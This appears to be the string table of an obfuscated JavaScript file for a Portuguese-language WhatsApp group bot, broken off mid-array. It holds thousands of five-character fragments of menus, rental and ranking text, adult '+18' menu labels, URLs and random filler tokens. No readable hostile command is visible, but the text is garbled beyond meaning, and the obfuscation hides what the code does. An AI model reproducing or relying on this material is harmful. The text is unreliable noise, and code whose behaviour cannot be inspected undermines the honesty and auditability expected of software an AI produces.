'qqTMz', 'BGKXq', "✅ 𝐀𝐔𝐓", 'htzHf', 'KXkup', "ort C", 'FFzPU', "nto. ", 'nkhar', "*❎ EU", 'repla', 'desli', "gite ", 'vgZJn', 'bAqbK', "\nﮩ٨ـﮩ", 'bGyZv', 'bpBOn', 'u8tjg', 'GODmD', "a Com", "em, o", "ono.\n", 'eIrFG', "one 0", ": ( ", 'tCXng', 'gWweN', " A Li", 'DSeSm', 'XPsPD', "CS) 🕹️", 'VDByq', 'capti', 'jVHyU', 'rreta', 'KxOxM', "o com", "do ca", 'NDADO', 'oKuej', "MUAY ", "s tag", 'nBaTT', "━◌━╮\n", 'EgMEi', 'OGybV', 'LcoyD', 'drqty', "k Do ", 'FQTNH', 'MLmCX', 'DcqWj', 'eilLg', 'zcjPF', 'zDujR', 'NoDfL', "es , ", 'AaEgr', 'gcPqH', 'RADOR', 'lURRg', 'spere', "DOS M", 'all', 'Leitu', "NDO C", 'lSkHU', 'EJmmh', 'Sbsns', 'chute', " em g", 'YfoBd', 'saiu', 'lho', 'multi', 'a.me/', 'AGZTS', 'WpiJE', 'CnrmK', 'listb', 'LdyQq', 'dOZds', 'fig.j', "1 e a", 'tivad', "esde ", 'BRANC', 'HsSQS', 'xZoAX', 'GCHFs', "r1 (", "rte n", 'nhGrj', 'jwIMT', "O sor", 'NqCbn', 'estad', "ória ", " suce", 'ahexo', 'VrEbK', 'FdtSY', 'RZldS', 'Xcdyx', "ção j", '╭───「', 'ATH', '://xa', 'nElFU', "elo m", "?? qu", 'notac', 'inobu', "foi i", "io pa", 'inRrR', 'bFbQR', 'fIMGx', 'aPaHv', " usad", 'RHYma', '𝐄𝐍𝐓𝐑𝐀', 'rcRYy', 'figba', "s: \n\n", 'cydcc', 'EPgwN', " reco", 'CTOMd', 'nxysh', "ixar ", 'dbVJE', "_~* :", 'vtmTM', "𝐒 ❌", "tá se", 'Mgcxj', 'HMIeh', "as ch", "ep we", 'JoWbF', 'siafi', 'wldbJ', 'dprem', 'bojvm', 'TuruW', 'KUZBF', 'm_Lea', 'lUObo', 'mated', 'mMHoK', "avra ", 'heemo', "ium\ne", 'JEBmJ', "a Par", 'HwaNT', 'nBtSm', 'rankg', 'pXhFE', 'emEgs', 'HHuSJ', 'ia:', 'egra', "cer e", "rão e", " _seg", "97. 🔞", 'qwiaW', "- O V", "io bo", 'YbifR', " agor", '𝐄𝐂𝐈𝐎𝐍', 'FFpwp', 'Bmuds', "tá pa", 'LCQyK', 'WPwxy', 'ciTlD', 'NSMIS', "ink\nE", 'BQdlJ', "Cade ", 'rgp', " já s", 'ot❎', "MIUM ", 'doriy', 'jnhJh', "r sua", 'uhSDq', "️  ", 'uzlnS', "raje ", 'pYuwt', " já f", '44x/s', 'MFMGh', 'Pydma', 'hhxpq', 'parti', "que e", ":* ", "m 2 a", 'beiro', "10 🕹️\n", "🇱 🇮 🇸", '/app/', 'hNpMR', 'nENYw', "iu, p", 'grave', 'zBiME', " tem ", 'v0.7.', 'IReuY', "𝐌𝐄𝐈 ❄️", "te do", 'nziXQ', './ind', 'evdni', "❄️\n", 'nProp', 'HskNY', '/heig', 'shift', 'kqNJe', 'YLmdV', 'GXaJy', "a Ser", 'mpsEC', '55219', '*coss', 'hEoBD', 'eAck', '0.53', 'nUTmi', 'fwRJd', "1 par", 'us-na', 'esqui', "o usa", 'nZEZH', 'GwxGP', 'kVAlE', 'RfVkg', 'n.x=-', 'ZIngx', 'pFsNY', 'KVdVd', 'cPHkH', 'kxsQw', "oi co", 'TJGuc', 'aKTSg', "NHA1 ", 'gSTgK', ",* Ñ ", "ig as", " 👾 」\n", 'nvite', 'SDhPF', '20e9b', 'vrurN', 'ahgcI', 'UiKBL', 'knIve', 'EHnex', 'borra', 'wiJJE', '|0|3', "r qua", " Modo", " GUNT", 'AKSfo', 'rcWmy', 'clAjs', '】ᴍᴀᴄᴏ', "\n8 - ", "gh ", 'VdWEh', "* ses", 'TYDYa', 'rl=', 'kito', 'local', 'Jwcya', 'PbGIa', 'trist', 'rupo:', 'aCyax', '────┐', "o Do ", "uer u", 'VyMye', 'jSQEr', '_code', "e prê", "vo: ", 'tNCdF', 'athb', 'njiPU', 'VWEVo', 'NK,', 'Peque', 'k/5Mx', 't+Cit', 'nHsuT', 'rerAf', 'lFuHX', "4: O ", 'StrFp', 'DKRgq', 'kDzJV', "   \nV", '_gpt', 'Aqui', 'vsXDb', 'LmRui', 'Adici', "𝐑 𝐎 𝐀", 'ALUGU', 'mbGYU', 'szrRi', 'ibAAg', "ídeo ", "ntel ", 'QqjcN', 'HkPEf', 'izand', 'zU8Hu', 'aper', 'tidos', 'BLzUd', 'EVyTh', 'ilida', 'CclBt', "em e ", 'RPQbP', 'NvtXR', "eu re", 'OBctj', 'tFtAz', 'fSWTC', "❄️ 𝐁𝐑𝐀", 'DCpqx', "ts ri", "\n\n_-_", 'YwFxK', '【᯽𒋨📷:', 'DloRp', 'seNam', "ono e", 'RxOUJ', 'tvgwY', "Por e", 'WnDZK', 'wJcnS', "r com", " ving", 'TYWYt', 'mzeBg', 'DRuFb', 'NFFKX', '6|5', '*🤖RAN', 'attem', "𝐍𝐄 𝐅𝐀", 'LAOBT', 'ition', 'itfNh', '4951.', 'jEsdP', "a bai", 'adinh', 'pyJUJ', 'queir', 'enqua', 'QSaaO', '𝐒𝐢𝐦𝐢𝐥', "stá i", 'naYTX', "po 📝", 'a?q=2', " fez ", 'dMbvi', 'SgQBi', 'vEFrS', " em r", 'antip', 'cUoNL', 'yLCLq', 'ZKpaA', "anti ", 'alCGW', 'zqbvy', "ADO P", 'mYZmQ', "🎥 𝐒𝐄𝐋", 'KIaUt', '.com', "*\nTot", 'AGNdM', 'Améri', 'aRSDL', 'CvDVQ', 'hfxBq', 'aDF5W', "é hor", 'vPMEz', 'getqu', 'jGvZR', "e, vo", 'nime2', "0 - 🎥", 'ODeOi', 'rquiv', 'QfIOm', 'uFfai', "Modo ", 'zgVtJ', "e: @", 'dvPAW', 'cJEox', 'IzOhJ', 'eHzSE', 'es/%2', 'ILSYN', 'rkZwx', 'PuHdw', 'Obdpp', 'coman', "~ ATE", 'LgwAJ', 'air-1', 'DAAww', "vel j", 'HJDwa', 'RsjkM', 'CcVKq', 'BhEtD', ". Peç", "am o ", 'ament', "𝐀́𝐑𝐈𝐎 ", 'sKSCN', 'VcinW', " Sim*", ", mul", 'qxTwJ', " ] ", " ADM ", 'pfSBF', "_\n\nSe", 'zynWM', 'denti', 'Xzlyy', 'fKoDj', 'EXjmS', 'nt_re', '/vHvZ', 'USnGY', "o.\n\nO", 'guel,', 'pGEWi', 'sDCZZ', "ra va", "na! V", 'ovHDV', 'OtuPH', '5d4ph', " fich", 'Titul', 'KKXXS', 'u!✅*', 'istar', 'eYFni', "l ano", 'YBSSF', 'SjRbX', 'bjRLn', 'ge.', "+18 7", 'ᴏʀᴅᴀ🍿', 'QyohB', "ei A ", 'utNhk', "não f", " acab", '44726', "️ 𝐌𝐄𝐍", 'GDnuC', 'band', '/gif/', 'tSDh6', 'FkVod', 'SgJim', 'mxydB', 'listR', 'bRKqQ', "OMUM ", 'sNXHj', 'cnJJE', " de R", 'muNdd', 'uFfAj', 'MoiLr', 'YufWq', 'RJztz', 'TIRkx', "é do ", 'anime', 'IvoGC', 'DvLRy', 'Txeif', 'b7bd4', 'coeEW', "rou 2", 'JEQpF', 'potif', 'Basic', 'tSKiV', " muta", '0Lftz', 'kVjPV', '1️⃣2️⃣3️⃣4️⃣5️⃣', 'packl', 'OkHbR', 'aNMAb', 'BjFsA', " neym", "gif, ", "ia do", 'r2Tim', 'obais', 'tgGXv', 'vQoSk', 'BTMHP', " ou á", 'FUeDj', "tão s", 'CSBUC', '2|1|6', "❄️ 𝐑𝐀𝐍", 'laTkX', "foi r", 'wuyCF', 'LfDdu', '?utm_', "de vo", 'fCgnc', 'jfEgv', 'EWnsx', 'ank', " ofer", 'wSemc', 'ugdVR', 'YKJps', "𝐈𝐓𝐎 ❄️", '/file', "ra, i", 'mgvuM', 'zfmOw', "usar ", 'zTzvi', 'YqEKi', 'upmpp', "uto F", 'yoRnr', 'tojHS', "tema ", 'Chanc', 'HEEiV', 'OS/lo', 'setpr', 'ateCo', "teio ", 'NDA', 'PtkcE', 'GdzVL', 'AGABU', 'hZoBz', " enga", 'ile/8', 'keyso', 'fjeYL', 'ooUoA', 'EdfpI', 'LvCRV', 'TLDfI', 'matri', ", pre", 'priva', " Para", 'Nome*', 'rabal', "e Da ", "*\n—\n•", 'vDOGh', 'Comun', 'TBQtb', 'Parec', 'LarqV', 'qJoMi', 'GOAlp', 'Funçã', 'RBHSg', 'case', 'SwWmi', 'KPrGQ', 'HRbsO', 'brar.', " quis", 'spvhW', 'fTWcg', 'istór', "a ide", 's/Mar', '𝐎-𝐂𝐇𝐀', 'carbo', 'Lpsah', 'mIxMl', "tra n", 'isLin', 'neon', 'PLyEs', 'LCiRZ', 'JxcoR', "%\n╏❆ ", 'FTAzr', 'igar', 'l/fig', 'uVPgq', "eira ", "85. ❄️", 'ng-bo', " ❄️", " os 1", 'hRoHP', "O Lin", "🇯🇵 𝗚𝗥𝗘", 'api-c', 'o=dec', "na te", 'propr', " preg", 'NTBJv', " ANAG", 'vqHqj', "nti p", 'vZfJa', 'yLERT', '-medi', 'fazer', 'nZerH', "derá ", 'vInxX', 'menag', '090/a', 'uSDxM', 'wwIEG', 'OfUhu', "🔞 𝐌𝐀𝐑", 'aOqUo', "um te", 'VACqW', 'cQTGF', 'rmvHe', 'iqbSJ', 'JnIat', 'yOYTS', "e tiv", 'zhhtR', 'iUhAh', " lotu", 'kasa', 'ZmAlN', '1.apk', "d par", 'ctLYj', 'mxHlc', 'ojpPL', 'toLow', 'IeDRR', 'GaeLv', "O BOT", 'iGVvw', "o Gru", 'vido(', 'nsHyp', 'o(s):', 'WKcQl', 'EhXWL', 'oFmra', 'LscIZ', "to po", 'Sorte', "\n║\n║✼", " rest", "o a e", "\nUplo", 'NbNQY', 'idIqf', 'vOFYC', 'vtPqF', "s Doi", 'TsLKk', 'DyGNy', 'suNyb', "l. 😬", 'XNOjY', 'NREWi', 'EUlOp', 'RYrYc', 'GEwGH', 'opy', 'nivzh', "um be", 'IGCct', "os do", 'LcpBs', 'SpfMW', 'nt/ap', 'longo', 'oObjS', '7%25&', '835ed', 'sta.', 'isos', "e êxi", "l:\n\n", 'zlozV', 'Nquxe', 'eOrmU', '-ɢɪʀʟ', 'cts=1', "O pre", "s. Is", 'Hgruv', 'wqdvM', 'OhHXU', 'qfHWR', "á usu", 'ICRIo', 'tJDnI', "r est", "✼┉╗  ", 'palug', 'wbOgD', 'GrmDP', 'uxljF', "l reb", 'siGMY', "2 vez", '.✔️', 'tKPyp', 'QnuMJ', " o ID", "a pal", 's/Bab', 'cdQki', ") Chr", 'lxFKf', 'BpwBM', 'fctOT', "• *Gr", "a faz", 'AIHCa', "á mai", 'IfBmi', 'DEtXV', '𝐆𝐀𝐋𝐕𝐀', 'iAztF', 'hshxE', "o hoj", 'rupo*', '1052b', 'nsage', 'units', 'dwGfJ', 'jdEdN', 'LYHDg', 'fITso', 'ndos.', 'mduhg', 'eKoly', "Play ", 'wUggb', '/101.', 'gbGii', 'XNrwk', 'oleEW', " É ", 'VOQjO', " GP: ", "𝐍𝐀𝐈 ❄️", 'KAoBj', " prod", 'HCKFq', " 1, p", 'tvYSw', "lds o", 'mxVzc', "MENU ", 'Sim', 'vSOkb', "m 😏..", 'IHWEb', "ndo a", 'dHNfq', 'MxkkA', 'tIQZu', "Que v", " 0 pa", 'NoboS', 'eEvsl', 'iciaS', 'HrOsk', 'RVdMo', "a men", "  💨\n ", 'fpsma', "\n\nO a", 'jThsV', "+18 3", 'sNntG', "gos c", "do jo", 'oosMH', "nge. ", " 50 G", "\nOla ", "vel d", 'sXIBa', 'zocLK', "aça o", "s: ", 'txtbo', 'atrYt', 'cZwzn', 'share', 'NZwmY', 'zgFov', 'STAGE', 'er.co', 'achi', "🇯🇵 𝗠𝗘𝗚", "ndo u", 'ohNFp', "44. ❄️", 'DCvHC', 'as|', 'OlBUJ', '56e25', 'Bhgiv', "_\n_*E", 'Tjbnc', 'qGFyq', "Onde ", 'qtyIj', 'estou', 'lXDrr', "ts lo", 'ay%20', 'cjOwJ', 'BTZaU', 'rVWFS', "a sor", 'cAcTB', "sapp ", "ou ca", '..😑', "is 😑", "po : ", 'nRPSW', 'pecia', "RUPO ", "𝐘 𝐌𝐀𝐓", " algo", "A áre", 'RAA', "23. 🔞", 'lEsGP', 'xIuuX', ") nov", '𝐗𝐈𝐌𝐎🔥', 'NJSxn', "KD a ", 'HMRvk', 'gem', 'bADUX', " Leti", "│➽ DE", 'vhHjZ', "l 🕹️\n", 'HzsWN', 'uTiqE', "me at", 'eVEmV', "E ATU", "OU NO", "BRO C", 'IDADE', 'NjYjN', "da:* ", "xo nã", "ig yo", 'ukach', 'HzzuC', "+18 8", 'RJxBt', "car o", 'FXdbp', "der d", 'gadom', 'uStlr', 'ZLzVw', 'JINrr', 'TZTvE', 'abeça', "u por", 'neon3', '3|0|1', '═════', 'ovOIW', 'HleZR', 'jfsFr', '5KKi0', "cê pe", 'iibIl', 'cgdTR', 'DjxZr', "ld nã", 'banho', 'cZdOq', "ao se", "é uma", "M Dis", 'uyStp', 'GjBlG', "🐃\n   ", 'rmalu', 'Tabel', "m\n\nVo", 'ySett', "É iss", 'ata_R', 'iGoXT', 'tvRqW', 'pwqOr', "? \n\n「", 'ZDlex', 'xWuDh', " Bot ", 'UNrAb', " \nGRU", 'rRYLB', "um, s", 'OGIQr', 'Confo', 'doGfU', 'jfMEA', 'anqAE', 'NSsTi', 'EGdzq', 'de6a9', 'wEvVG', '_inc', 'conse', "se! 🌟", 'wipIL', 'Cliqu', 'ntifi', 'pzVnm', "ório\n", " prêm", 'xXCWn', "ou em", " usuá", "ra co", 'FVoft', 'nxfUj', 'VmXzQ', 'CMxeI', 'iehnU', 'lofuV', 'GUjyZ', 'suges', 'ASgPg', 'MLksE', 'iYQYI', 'qMnbK', "OM SU", "𝗡𝗔 🇯🇵", 'WeOvF', 'is%20', 'menup', "   *𝑷", 'do*', "ISTA ", 'antin', 'i/%20', 'dGrWl', 'depac', 'yKDzn', "or 🤧", "ida, ", 'MXOYq', 'nistr', 'TsCfl', 'ODwkm', 'ngbUB', 'PCgAk', 'szidV', 'XCUTR', 'Apwwh', 'SPceW', 'DYNbG', 'mMIfi', 'gwmLW', 'PSIDC', 'cacha', 'ontad', 'eAwRq', 'uKfKl', '|𝟠𝟠𝟠|', 'ição*', 'engp.', 'rte', "o 🧠", 'oper.', 'CtpCb', 'GgdXG', 'tGPTR', 'Syoye', '/revi', 'LuEwM', 'GqVsN', 'IyzuJ', " YOSH", 'qbVuY', " 𝐃𝐄 𝐎", 'RybkC', "a / D", 'DKvIX', 'fAIgX', "ot ou", 'pnLcQ', 'cesso', '_chec', 'upos!', 'b0857', 'Jsbfk', "o+18 ", '/temp', 'HADOR', " 🙄😆", "e Fox", 'xdrqQ', 'lgGri', "link ", 'PmEyr', 'Jogad', 'axqWi', 'TINEZ', 'bRIyE', "ão do", '𝐎́𝐑𝐈𝐀𝐒', "na ad", "O Emo", "\n├𝐃𝐢𝐠", 'mybbU', 'jisXC', 'ngLzW', 'GMXrN', '1ff22', 'zCtLO', 'GGHjB', 'axQiI', "\n\n4: ", 'rde..', 'hiray', "IRO ❄️", 'table', "a.. o", "𝑶 📁", 'WfGoq', 'AFmmF', 'tqRrL', 'XJrHN', 'fGExo', '&img=', 'oXxLz', "oras ", 'jUqQX', 'OaPSo', " beba", 'HbxIj', 'rIRBn', "or o ", 'ao|no', "\n\n1: ", "𖣘⃟ᗒ Co", 'filte', 'tab', 'Emoji', 'então', 'LWsbQ', 'SfBvV', "Menu ", 'Jotjz', '@s.wh', 'HJAGp', 'sforç', 'nKvSS', 'icRnk', 'KvYFC', "co da", "(1)\n2", 'gqnYv', '────', "e fal", 'eZvIl', 'XFkfd', " é cr", 'GOLD', 'fCZLI', 'ffer', "ce pa", 'kRiVd', 'ptlVm', "89. ❄️", 'ity=2', '.75MO', 'SvqPh', 'bEfEI', 'ZXWAT', 'cEDrf', 'OkIan', " HH:m", 'esult', "á tá ", "TA2 ❄️", 'ahShn', 'hora', "pra l", 'hzRnX', 'aupRQ', '4217', 'koMPa', 'uGPOR', "esso ", " falt", "enda ", 'TERAJ', "o Dst", 'Ltrob', 'jDhAK', 'hgjep', 'WzFbU', " bolã", "ra at", 'MENTE', 'ItdOg', 'ShSGK', 'WBvir', 'nuigx', '_coun', "AL FO", 'blgbR', "e ai,", 'LjjNs', 'tbl', "ão pa", "e par", "47. ❄️", 'dFhNb', 'ASjrk', 'Envio', 'neira', 'fdMsN', 'ealiz', 'inecr', 'BgJyX', "o gor", 'track', 'uhHeV', 'riiCx', 'HxLxk', " só m", 'pqrmL', 'XxWaB', 'bpVJn', 'fChHw', "upo q", 'go.', "eado ", '.0.37', 'kooCI', " sist", " @ful", 'BPpHP', 'Mestr', " é qu", 'high', "do pl", "🇯🇵 𝗔𝗦𝗨", "𝐈 🔥", 'gay', '92d3D', "mim p", 'CPmNZ', " o em", 'WXhjA', 'ext', 'omFLH', "iver ", 'tus1', " brec", " se n", 'Cornl', '21edc', 'UXjSw', 'playa', 'YJiie', 'znhTo', 'ualqu', 'xDbnc', 'KuYGe', '/xana', "á log", '44dd4', " Bot:", 'tMbbX', 'berry', "ocar ", 'gold', 'owJjv', "\n▢ *T", 'jwWgi', 'viewO', "o apk", 'OCeUN', " onli", 'feito', "rmux ", "r col", 'FfNTf', '10456', 'cpri', 'WcUKl', 'roQZi', " Audi", "𝐔𝐓𝐎𝟑 ", "from ", 'kSbjW', 'opone', 'dos-u', 'eo/%2', 'desej', 'mxrCL', " - NO", 'HtRte', 'ime&a', "𝟕 🔞", 'timg.', '0|11|', 'NDAgp', 'Perfi', 'zCaNI', "l faz", 'jogo9', "s meu", " ser,", 'fezQF', 'mbBsg', 'nviou', " conv", "al do", 'e6aef', "e *At", 'bugs,', "ela, ", " Enqu", 'usuar', '..!!', "nue a", '9a128', 'EuQpk', 'YRCun', "la.\nV", "AR / ", "𝐄 𝐃𝐄𝐋", 'EuITq', 'lobal', '5e69', "Gado ", "pos e", 'genti', 'packb', 'rMKji', 'restt', 'ntico', "o) @", "anna ", " e um", 'pUOpu', 'profi', 'JpAUl', 'kEucs', '01418', "ao ve", "to é ", 'WHAFo', 'MmSoV', 'ndo1', 'porra', 'GHyDt', "ink 0", " 0\n\nA", " SURV", "to:\n", 'chMyE', 'PvFFg', 'manei', 'FiZbY', 'perfe', 'qPaqZ', 'binar', 'dhilV', 'rKmzV', "udo D", 'IIpcv', 'kMIqo', " 𝐌𝐂 𝐏", 'TwzEV', 'QjrcA', "r, ma", 'Lyqik', 'efl', 'runc(', '_usu', 'TuBbW', 'jWtDN', 'quiza', '/pack', "( NOT", 'zKAnw', 'GRAMA', 'jDLiQ', 'YxKuL', 'PpJEv', 'fffBL', 'yGsIa', 'ont.s', 'KrqHP', 'veVSQ', 'bFbhh', 'n.spo', 'IVcgo', 'tre-s', '╭┅─•𖧹', '】ʟᴇsʙ', 'EVP', "as é ", 'ion:', 'ykUDO', 'Vindo', 'aa88f', 'tCyan', 'DqPdk', 'HsedG', 'rfKME', " COLO", " Oper", " inic", 'gdeZx', " *Tem", 'QbAcs', "e o c", "I BAN", 'restg', 'ROBLO', 'JaMbD', 'LVKIo', 'inkgp', " do d", 'tsapp', 'crgAA', " 𝐕𝐄𝐑𝐌", 'VjBvB', 'posta', 'ISOBU', "s se ", 'ra_of', "oi ro", 'bTrDt', 'LkICd', "fios ", 'LugWR', "76. ❄️", 'gcdac', 'mina', 'KodTY', 'xmJpu', 'ZWUmD', 'ipBDz', '^_^*', 'Mxjkm', 'KIPYU', "* *@", "ipv2 ", 'TcuRO', 'zRUKw', 'rdeTX', 'rsRIj', "xy a9", 'GP.js', 'dwptk', 'ena..', 'ufaJp', 'compl', "𝑂𝑀𝑈𝑀\n", " ou m", 'jOIdC', " cria", 'dDRkL', '961c3', 'LmsEC', " rece", '💎❆̸⊱━━', 'bKVCy', 'adv', 'anhar', '0:320', " o re", 'HQSfG', 'xJbHH', "il: e", '302070ISUoqR', 'oeRjd', 'panic', "te 3 ", 'iakQL', "axa d", "─≽「 👾", 'recur', 'Playe', 'rwa', 'ZPMJq', 'kgayO', 'tOaWE', 'sLfux', 'xYiBi', "tar a", 'nção*', 'xI49c', "ão, n", "re: ", "er ig", 'gwTxP', "6. 🔞 ", 'HBJcH', 'o!*', 'ryeCQ', 'ZtMWX', "hou ", "nhou ", 'ktvhG', 'lmyfQ', 'hJXgy', 'ZlDte', 'nXnRh', '0_Off', 'sihNA', "EL NE", 'RAytn', 'lcFMF', 'attp6', " DE G", '[()ab', 'gZpne', 'VvRJy', " regr", 'KEJBu', " 5 MA", 'Vence', "ais c", 'USxNv', " Akil", 'dkOFy', 'HaixZ', 'KJAoC', 'ck-5-', '/AVIS', "ta, u", "\nJogo", 'ropos', "By Va", 'wJQWL', 'tsoGv', 'snzmg', 'egLxq', 'efkDp', 'catch', "pós 3", 'phWuJ', 'jiSCf', "er De", 'iQsbo', 'nmJEp', 'sYfle', 'Dccqg', 'tivem', " 👿+😇", 'SADOS', "lo: 5", 'WfYSw', 'TSKPk', " ZENI", "\n\nEss", 'igu', 'grDHT', 'LtmKe', 'a.mp3', 'or/fu', "3 VEZ", "ido t", " a + ", 'nLZVp', 'RMIDR', 'rhpff', 'GCQvm', " Teto", 'fmOYK', 'DoBot', "ar ex", 'VbSWl', " Mr. ", 'bMykv', 'lengt', 'nime', 'Tuyxe', 'INATI', 'ar...', 'NxoTt', "o Goo", 'fenwI', "\n╭───", 'd7185', "m pro", " ther", 'plaq3', 'LWluO', "ele d", 'mvWyE', 'hRnXx', "e 🗿", 'CEmqB', 'CzWGu', 'cmd.j', 'NWExR', 'arcar', "\n\n|__", 'plica', 'Corri', ", sai", "guns ", 'ntifa', 'tFPBl', 'gcWQo', 'sale_', 'zPYmv', 'xHdCC', 'tirvd', 'vlpCG', "bela ", 'bGRmD', 'afk', "ks, e", "nces ", 'YwKEu', 'HuILG', "IDE A", 'SujQd', 'Ywpvm', 'ns.', 'wOuJR', "osdl ", '_alug', 'ijsGS', 'ZrNBv', 'xjbQN', "el\n\n2", 'votaç', 'ausen', '-read', 'togp', "A Fac", 'cards', 'ultad', "ão. D", 'umaqD', 'yUsag', '%201.', 'jAZOJ', "ra le", " quar", 'mVZrj', 'falar', 'imit', " 𝐁𝐄𝐋𝐋", 'XgNiM', 'ionad', 'bYspx', 'izer=', 'pSdFp', 'NYqKg', 'rch', 'SKSDs', "NHA2 ", 'fvHlB', 'EYxSF', 'utput', "us pe", 'ntuaç', "foi d", 'OaGgB', 'bpwAa', '0|8|9', 'ada.', 'zUddG', 'visuU', 'JlmDa', "39. ❄️", " 🇫 🇮 ", 'ertou', " erro", "mo 50", 'KDoKw', 'papel', 'tNuma', 'tinuo', "com r", "or, d", "r alg", "a pró", 'clona', "(s) ★", "ld Ro", 'PCcZz', "eno*\n", 'zMZbv', "ra ac", 'SthES', 'gePar', 'OdHze', 'ile', 'LUyAN', 'DbobA', '397', '4c8e0', 'vKLCl', 'usfdg', 'oTlhu', "ium 🕹️", '-_-_-', " esse", 'wnAjU', 'in/nu', 'text', 'UeFBR', 'igsta', "per j", "tem q", "5 99 ", 'zIJPm', "lds )", 'raaJp', 'oTZvk', 'SROEh', "te de", "mo, c", 'bType', '*Escr', "te es", 'Voour', 'dqimy', "icou ", 'os/ba', 'rankc', 'entif', "a emp", 'kEIzw', 'dwaKR', "as co", "nida ", 'nesce', 'iaZeO', 'QkMcH', " ativ", 'ImuSP', 'cYaMD', "r o c", 'NHffQ', 'dos-t', 'SSIBv', '════┉', 'Noeap', "nte p", "~> @", 'XSbLO', 'KTBxW', "\n\nRev", 'er_au', 'adrfy', 'antim', 'pollC', 'lUGtb', 'Ident', 'ile/c', "o 400", 'pGlcw', 'WlWgo', 'opuHl', "em va", 'yvNPB', 'on/cc', 'tapa', 'QBEvs', 'MYdBx', 'hClwt', 'on/pg', 'ufxEs', "9 seg", "nner ", 'coes', "ྀ🚸 ི⋮", 'nick', "u des", 'ostar', 'cavfE', '-ss', 'LHuQR', 'ile/1', 'CcnnO', 'KQCJK', 'ELDhY', 'mapcN', ';(asy', 'comun', 'nYiLU', 'auto', "𝗟𝗜𝗔 🇯🇵", 'sUDCe', 'PMSXL', ", o Y", 'ituir', 'xORnJ', 'timo', 'mvMWI', 'hanHd', 'XaJuJ', 'TFdSj', 'secre', "omo u", "RCE G", 'evel:', 'XWDwn', "res D", " ⟯ - ", 'Adeus', 'laXKp', "as mi", 'wACgY', 'oZfuG', '5|1|8', 'GoTyS', '33r7p', 'ele.', "GB\n💾 ", "r\n\n", 'xTBiK', "dar a", 'HxpLK', 'EBQow', 'pMDux', "o Mes", '0:a]a', "ar na", 'sEcfx', 'iHumW', "ens m", 'ccAfk', 'xPqTc', 'zjWsX', 'tSlzI', 'ontém', " Com ", "o tel", " Regi", 'zizLA', 'packo', 'guel.', 'dUeYL', "ER LU", 'akpqU', 'kNIZs', "RANK ", "😞 _Oc", 'ilink', 'lovem', 'OdMEl', 'MNsUV', "s tar", 'BMWkc', 'textM', " Esta", 'CNPJ', "vo de", 'Escol', '-name', 'KFXUF', 'delet', 'orZsw', " da e", 'HukzA', "que 1", 'GxBdr', 'RlUiQ', 'idfRZ', 'renam', 'ffava', 'GIF*', 'pido.', 'keys', 'gVblX', 'EHnau', '=o:wi', " brev", 'ShRoU', 'Jqyde', 'ethqY', 'uDWVf', 'listp', "tar, ", '://ur', 'LiMxP', 'menti', 'wihej', "meu c", 'agem(', 'ncade', 'QHBPy', 'vLFij', 'EjXSM', 'an*', "Seja ", 'placa', 'ono_O', 'neon1', "Só ge", 'BUmcR', 'RlwJT', "ABRE ", 'NxqoG', 'YiDNt', " +15%", 'ajuda', 'ico..', " PV: ", "dar q", 'bUVpe', 'iEqiS', 'DLdxz', 'ZlmYG', 'EOPCl', 'WWybR', 'nYAZL', '/núme', 'sjenk', 'EgAsN', 'HESYr', 'ezOgF', 'daPjv', 'bwcYs', 'p://p', 'QlceA', '【✔】ᴘᴏ', 'Calcu', "Uma d", 'horas', 'tRQRC', 'XqPiH', 'Estra', 'RopKA', 'arraf', "ro 1 ", 'novam', "❄️ 𝐍𝐄𝐙", 'DOFrG', "res q", "r ter", '9oWS6', 'EkkhS', 'ressi', 'pQmGX', "F𝜣T𝜣\n", 'xOkzv', 'ar_CM', 'OBEIU', 'QNmCu', '2|5|1', 'VWnht', 'ime?q', "15, p", "48. ❄️", 'sCKpw', "🎯 Des", 's..', 'AlOyV', 'cToAc', "vite ", 'CSzev', 'yohpw', 'es/16', "𝐎̃𝐄𝐒 📀", 'merda', " ROMA", 'jVCnc', 'EEvdY', "bter ", 'vCAKw', "T A T", 'BSzKk', "rei e", 'CHWYr', "gulo ", "io Ad", 'wnyPn', "R 🌹\n", 'PvpVh', "to\n1h", 'Gzkrz', 'TVARV', 'hJbtn', 'ZNFfW', 'HlrYf', 'UycAe', 'vigeY', 'yYzgn', 'zSQUX', '2970856MfbjYF', 'UaLiG', 'qtsrm', 'rna.', "de a ", 'CIwtb', 'MqKus', "ᗒ @", 'dhZnJ', 'PlTQP', 'afire', 'txt-d', 'lCPjQ', 'oji', 'ILIAL', 'oveIh', "o arq", 'iKjsa', " GOKU", 'filei', 'wepzS', 'ztmUC', 'BzTfd', 'HFwlB', 'ekTXd', 'AQmbr', "[()+ ", 'pcVvj', 'dDVrE', 'ibQKj', 'UiwqV', "s I 🔞", 'IggLa', 'DpCSy', ":\n\n", "❄️ 𝐀𝐍𝐈", "ig br", 'AaIyI', "ue jo", 'inks', 'uqfSf', 'OQNWL', 'le/ge', 'data:', 'lmdYX', 'PWPNn', 'bvSrE', "\t~ VS", 'kGGZG', 'lrvqf', 'gangb', '09f64', "🔥\n\n╔┉", 'eed1z', '1|0|2', 'orocB', 'tamen', 'UzGZs', 'Candi', 'engal', 'sKrtK', '11:01', 'iiuIr', 'tKbVJ', "/ dig", 'tEnct', "l 🗿🍷", 'LczkE', 'uCQzj', "ZADO ", 'jXpGM', 'Regis', 'kHyUo', 'JTGpq', 'ePpHJ', "║\n╚┉✼", 'u/mai', 'pbOSJ', 'dNRBB', "16. 📍", 'able', 'irta-', "𝐍𝐎 🔞*", 'pg?pr', 'ZmHqU', 'TtnyE', 'KTSZe', 'NKgit', 'ohWyQ', 'itoge', 'dNWwl', 'sAmop', 'ping3', 'Algue', "lo, o", 'ZzGUM', 'rnwPc', 'app/s', 'GNRiD', 'etras', "m @", 'TKD1B', 'BSsym', 'EhbfQ', 'DOlPz', " é de", "slot ", 'IOjWA', 'vsBjc', 'NpWoG', 'qcdwq', "EI ❄️\n", 'mo.', 'dIQVd', '|0|6|', 'kmtTG', 'wUZnb', " do b", "BS: E", 'AOSMp', 'diTUr', 'DqJwP', 'Ksdxb', 'QAfIB', 'LdjTz', '🐉🐅', 'lSPbT', 'BgIWA', 'WIHLn', "urso ", 'gaMwp', " Mod ", 'bnKfH', 'KKgeM', 'opOsG', 'TNmkR', 'csrKo', 'actio', "res d", 'aesBS', 'bdec0', 'aixsN', '/jpeg', 'steel', 'mLRDg', 'ZdeZm', " 𝐏𝐈𝐄𝐂", "❗] Al", 'InrhR', 'OZuSL', "sta d", "e a p", 'ljMiV', "a rol", 'WUqec', 'qTReK', 'KtVQC', 'qOuMg', 'ência', 'zECpP', 'mplo:', 'kjQhn', 'led', 'fRXho', "╭─*「 ", 'bpwjK', 'p.com', 